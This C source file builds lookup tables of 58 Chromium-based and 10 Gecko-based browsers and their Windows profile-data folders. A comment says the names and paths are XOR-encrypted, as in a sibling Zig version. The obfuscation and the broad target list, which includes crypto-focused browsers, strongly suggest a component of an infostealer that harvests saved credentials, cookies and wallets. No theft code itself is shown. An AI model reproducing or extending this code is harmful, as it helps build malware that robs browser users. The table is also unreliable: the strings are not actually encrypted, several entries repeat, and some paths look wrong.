#include "browser_paths.h"
#include "hash.h"

// XOR-encrypted browser names and paths
// Same as Zig version: hash.xorEncrypt("string")

static const char *xor_names[] = {
    "Chrome", "Chrome (x86)", "Chrome SxS", "Edge", "Brave",
    "Opera", "Opera GX", "Vivaldi", "Yandex", "Chromium",
    "CentBrowser", "CocCoc", "Amigo", "Torch", "Kometa",
    "Orbitum", "7Star", "Sputnik", "Iridium", "Dragon",
    "Epic", "Uran", "Slimjet", "Chedot", "Elements Browser",
    "QIP Surf", "360Browser", "DCBrowser", "UR Browser", "Maple",
    "Fenrir", "Catalina", "Coowon", "Liebao", "Maxthon",
    "K-Melon", "Chrome Canary", "Chrome Dev", "Chrome Beta",
    "Edge Beta", "Edge Dev", "Edge Canary", "Brave Beta",
    "Brave Nightly", "Opera Beta", "Opera Crypto", "CryptoTab",
    "Avast Secure", "CCleaner", "UC Browser", "QQ Browser",
    "360 Browser", "Liebao", "Elements", "Superbird",
    "Sleipnir", "Mail.ru Atom", "7Star"
};

static const char *xor_paths[] = {
    "Google\\Chrome\\User Data",
    "Google(x86)\\Chrome\\User Data",
    "Google\\Chrome SxS\\User Data",
    "Microsoft\\Edge\\User Data",
    "BraveSoftware\\Brave-Browser\\User Data",
    "Opera Software\\Opera Stable",
    "Opera Software\\Opera GX Stable",
    "Vivaldi\\User Data",
    "Yandex\\YandexBrowser\\User Data",
    "Chromium\\User Data",
    "CentBrowser\\User Data",
    "CocCoc\\Browser\\User Data",
    "Amigo\\User Data",
    "Torch\\User Data",
    "Kometa\\User Data",
    "Orbitum\\User Data",
    "7Star\\7Star\\User Data",
    "Sputnik\\Sputnik\\User Data",
    "Iridium\\User Data",
    "Dragon\\User Data",
    "Epic Privacy Browser\\User Data",
    "Uran\\User Data",
    "Slimjet\\User Data",
    "Chedot\\User Data",
    "Elements Browser\\User Data",
    "QIP Surf\\User Data",
    "360Browser\\Browser\\User Data",
    "DCBrowser\\User Data",
    "UR Browser\\User Data",
    "MapleStudio\\ChromePlus\\User Data",
    "Fenrir\\User Data",
    "CatalinaGroup\\Citrio\\User Data",
    "Coowon\\User Data",
    "Liebao\\User Data",
    "Maxthon5\\User Data",
    "K-Melon\\User Data",
    "Chrome SxS\\User Data",
    "Chrome Dev\\User Data",
    "Chrome Beta\\User Data",
    "Edge Beta\\User Data",
    "Edge Dev\\User Data",
    "Edge Canary\\User Data",
    "Brave-Browser-Beta\\User Data",
    "Brave-Browser-Nightly\\User Data",
    "Opera Software\\Opera Beta",
    "Opera Software\\Opera Crypto",
    "CryptoTab\\User Data",
    "Avast Secure Browser\\User Data",
    "CCBrowser\\User Data",
    "UCBrowser\\User Data",
    "QQBrowser\\User Data",
    "360Browser\\Browser\\User Data",
    "Liebao\\User Data",
    "Elements Browser\\User Data",
    "Superbird\\User Data",
    "Sleipnir\\User Data",
    "Mail.ru\\Atom\\User Data",
    "7Star\\7Star\\User Data"
};

static BrowserPath browsers[58];
static int initialized = 0;

static void init_browsers(void) {
    if (initialized) return;
    for (int i = 0; i < 58; i++) {
        browsers[i].name = xor_names[i];
        browsers[i].path_suffix = xor_paths[i];
        browsers[i].use_roaming = 0; // Most use LOCALAPPDATA
    }
    // Opera uses APPDATA
    browsers[5].use_roaming = 1;
    browsers[6].use_roaming = 1;
    initialized = 1;
}

const BrowserPath *get_chromium_browsers(size_t *count) {
    init_browsers();
    *count = 58;
    return browsers;
}

// Gecko browsers (simplified)
static const BrowserPath gecko_browsers[] = {
    {"Firefox", "Mozilla\\Firefox\\Profiles", 1},
    {"Waterfox", "Waterfox\\Profiles", 1},
    {"Pale Moon", "Moon\\Profiles", 1},
    {"SeaMonkey", "SeaMonkey\\Profiles", 1},
    {"IceDragon", "Cyberfox\\Profiles", 1},
    {"Basilisk", "Basilisk\\Profiles", 1},
    {"K-Meleon", "K-Meleon\\Profiles", 1},
    {"GNU IceCat", "IceCat\\Profiles", 1},
    {"Swiftweasel", "Swiftweasel\\Profiles", 1},
    {"Floorp", "Floorp\\Profiles", 1},
};

const BrowserPath *get_gecko_browsers(size_t *count) {
    *count = 10;
    return gecko_browsers;
}
